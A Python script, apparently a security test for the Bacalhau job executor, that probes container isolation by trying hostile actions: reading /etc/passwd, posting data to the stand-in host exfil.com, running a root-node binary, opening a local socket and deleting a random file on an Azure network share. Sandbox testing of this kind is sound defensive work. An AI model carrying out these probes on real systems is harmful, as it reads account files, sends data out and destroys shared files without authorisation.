# Security Tester of the Bacalhau executor
import os
import random
import subprocess
import time
from pathlib import Path

import requests

debug = os.environ.get("DEBUG", "false").lower() == "true"


# Function to print results
def print_result(action, success, message, start_time):
    end_time = time.time()
    elapsed_time = end_time - start_time
    if success:
        print(f"❌ {action}: {message} (Elapsed time: {elapsed_time:.2f}s)")
    else:
        print(f"✅ {action}: {message} (Elapsed time: {elapsed_time:.2f}s)")


# 1. Read /etc/passwd
start_time = time.time()
try:
    with open("/etc/passwd", "r") as f:
        content = f.read()

        # /etc/passwd comes from root node, not container
        if "azureuser" in content:
            print_result(
                "Read /etc/passwd", True, "azureuser found in /etc/passwd", start_time
            )
        else:
            print_result(
                "Read /etc/passwd",
                False,
                "azureuser not found in /etc/passwd",
                start_time,
            )
except Exception:
    print_result("Read /etc/passwd", False, "Error reading /etc/passwd", start_time)

# 2. Send content to a website
start_time = time.time()
try:
    response = requests.post("http://exfil.com", data={"key": "value"}, timeout=2)
    print_result(
        "Send content to a website", True, "Content sent to exfil.com", start_time
    )
except Exception:
    print_result(
        "Send content to a website",
        False,
        "Error sending content to exfil.com",
        start_time,
    )

# 3. Run a binary on Linux
start_time = time.time()
try:
    # Try to run 'bacalhau' which is only on the root node
    subprocess.run(["/usr/local/bin/bacalhau"], check=True)
    print_result(
        "Run a binary on Linux",
        True,
        "bacalhau ran correctly (container had access to binaries on the root.)",
        start_time,
    )
except Exception:
    print_result(
        "Run a binary on Linux",
        False,
        "Error running bacalhau (container did not have access to binaries on the root node)",
        start_time,
    )

# 6. Open a network socket
start_time = time.time()
try:
    import socket

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("localhost", 80))
    print_result(
        "Open a network socket",
        True,
        "Opened a network socket to localhost:80",
        start_time,
    )
except Exception:
    print_result(
        "Open a network socket",
        False,
        "Error opening a network socket to localhost:80",
        start_time,
    )


# 9. Delete a file in the network share
start_time = time.time()
try:
    share_path = Path("/azureshare")
    files = [f for f in share_path.iterdir() if f.is_file()]
    path_to_file = Path(share_path, random.choice(files))
    path_to_file.unlink()
    print_result(
        "Delete a file in the network share",
        True,
        f"Deleted file: {path_to_file.name}",
        start_time,
    )
except Exception as e:
    print_result(
        "Delete a file in the network share",
        False,
        f"Error deleting file: {e}",
        start_time,
    )
